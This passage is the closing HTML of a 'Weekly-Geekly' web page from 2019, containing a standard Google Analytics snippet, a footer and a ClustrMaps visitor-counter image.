    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>